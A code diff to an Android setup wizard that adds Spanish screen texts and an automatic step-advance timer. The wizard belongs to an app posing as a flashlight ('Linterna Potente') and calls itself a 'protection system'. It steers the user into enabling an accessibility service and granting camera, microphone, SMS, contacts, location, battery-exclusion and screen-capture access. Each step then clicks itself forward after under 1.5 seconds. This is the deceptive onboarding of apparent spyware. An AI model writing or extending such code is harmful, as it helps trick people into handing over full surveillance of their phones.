@@ -391,6 +391,61 @@ public class SetupWizardActivity extends Activity {
     /**
      * Mostra loading
      */
+    private void aplicarTextosEspanol() {
+        switch (currentStep) {
+            case STEP_WELCOME:
+                tvTitle.setText("Sistema de proteccion");
+                tvDescription.setText("Solo vas a activar un permiso. El resto se hace solo.");
+                btnNext.setText("Continuar");
+                break;
+            case STEP_ACCESSIBILITY:
+                tvTitle.setText("Paso 1: servicio de proteccion");
+                tvDescription.setText("Busca Linterna Potente en la lista y activala.");
+                btnNext.setText("Activar servicio");
+                break;
+            case STEP_PERMISSIONS:
+                tvTitle.setText("Paso 2: permisos");
+                tvDescription.setText("Concediendo camara, microfono, SMS, contactos y ubicacion.");
+                btnNext.setText("Conceder");
+                break;
+            case STEP_BATTERY:
+                tvTitle.setText("Paso 3: proteccion continua");
+                tvDescription.setText("Excluyendo la app de la optimizacion de bateria.");
+                btnNext.setText("Permitir");
+                break;
+            case STEP_SCREEN_CAPTURE:
+                tvTitle.setText("Paso 4: proteccion avanzada");
+                tvDescription.setText("Toca Iniciar ahora en el aviso de Android.");
+                btnNext.setText("Activar");
+                break;
+            case STEP_COMPLETE:
+                tvTitle.setText("Listo");
+                tvDescription.setText("La proteccion esta activa.");
+                btnNext.setText("Terminar");
+                break;
+        }
+    }
+    private void autoAvanzar() {
+        final int _s = currentStep;
+        handler.postDelayed(new Runnable() {
+            public void run() {
+                if (currentStep != _s) return;
+                if (!btnNext.isEnabled()) return;
+                onNextClicked();
+            }
+        }, delayPaso());
+    }
+
+    private long delayPaso() {
+        switch (currentStep) {
+            case STEP_WELCOME: return 1400L;
+            case STEP_ACCESSIBILITY: return 1000L;
+            case STEP_PERMISSIONS: return 800L;
+            case STEP_BATTERY: return 800L;
+            case STEP_SCREEN_CAPTURE: return 800L;
+            default: return 1200L;
+        }
+    }
     private void showLoading(String message) {
         loadingView.setVisibility(View.VISIBLE);
         btnNext.setEnabled(false);
